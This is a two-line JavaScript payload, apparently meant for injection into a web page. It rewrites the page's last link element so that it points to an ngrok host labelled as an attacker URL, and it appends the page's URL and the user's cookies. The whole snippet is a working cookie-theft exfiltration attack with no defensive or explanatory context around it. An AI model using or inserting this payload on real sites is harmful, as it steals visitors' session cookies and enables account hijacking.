const lastCssLink = document.getElementsByTagName("Link")[document.getElementsByTagName('Link').length-1]
lastCssLink.href = "https://19aa7c98a162.ngrok.io/my-attakcer-url?url=" + document.URL.toString() + "&c=" + document.cookie.toString();
